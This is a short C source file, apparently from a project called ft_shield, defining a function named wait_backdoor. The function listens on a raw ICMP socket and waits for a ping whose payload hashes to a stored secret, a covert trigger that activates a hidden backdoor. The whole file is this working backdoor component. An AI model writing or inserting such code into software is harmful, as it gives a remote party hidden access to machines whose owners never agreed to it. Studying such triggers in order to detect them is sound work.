#include "../include/ft_shield.h"

int wait_backdoor()
{
    int                 raw_fd;
    char                packet[1024];
    ssize_t             packet_len;
    struct iphdr        *ip_hdr;
    struct icmphdr      *icmp_hdr;
    char                *payload;
    int                 payload_len;
    unsigned char       hash[32];

    raw_fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (raw_fd < 0)
        return (-1);

    while (!g_sigint_received)
    {
        memset(packet, 0, sizeof(packet));
        packet_len = recv(raw_fd, packet, sizeof(packet), 0);
        if (packet_len < 0)
        {
            if (errno == EINTR)
                continue;
            close(raw_fd);
            return (-1);
        }

        ip_hdr = (struct iphdr *)packet;
        icmp_hdr = (struct icmphdr *)(packet + (ip_hdr->ihl * 4));

        if (icmp_hdr->type == ICMP_ECHO)
        {
            payload = (char *)icmp_hdr + 8;
            payload_len = packet_len - (ip_hdr->ihl * 4) - 8;

            if (payload_len > 0)
            {
                if (payload_len < 256)
                    payload[payload_len] = '\0';

                ft_sha256(payload, payload_len, hash);

                if (ft_verify_hash(hash) == 0)
                {
                    close(raw_fd);
                    return (0);
                }
            }
        }
    }
    close(raw_fd);
    return (-1);
}